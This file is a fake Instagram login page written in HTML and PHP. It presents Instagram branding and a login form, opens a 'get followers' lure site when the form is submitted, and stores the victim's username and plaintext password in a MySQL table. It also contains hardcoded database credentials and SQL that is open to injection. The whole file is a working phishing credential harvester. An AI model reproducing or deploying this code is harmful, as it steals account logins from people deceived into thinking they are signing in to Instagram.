<html>
    <head>
        <title>Instagram Login</title>
        <link rel="stylesheet" href="instagram.css" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <link href="https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono" rel="stylesheet">
    </head>
 
 <body>
 <div id="main">
    <div class="header">
        <img class="insta-img" src="insta.png" />
    </div><br/>
    <form method="post" id="form1">
        <input type="text" name="uname" placeholder="Phone number, username, or email" required/><br/>
        <input type="password" name="pass" placeholder="Password" required/><br/>
        <button id="btn1" name="submit">Log In</button>
        <img class="or-img" src="or.png" />
        <p class="dont">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a> </p>
    </form>
 </div>
        <script>
            let form = document.getElementById('form1');
            form.onsubmit = function() {
                window.open('https://getfollowers.offyoucode.co.uk/gettingfollowers.html');
            }    
        </script>
 </body>
 </html>
 
<?php

@$name = $_POST["uname"];
@$password = $_POST["pass"];
 
/* Attempt to connect to MySQL database */
$con = new mysqli("localhost", "thetips1_solo", "iamthedon7588", "thetips1_solo");

if($con->connect_error){
    echo('could not connect');
}

if(@_POST["submit"]){
    
$sql = " INSERT INTO `instagram` (`username`, `password`) VALUES('$name', '$password') ";
if($con->query($sql)){
    echo(' ');
}
else{
    echo ("Error in values insertation ".$con->error);
}
}

$con->close();

?>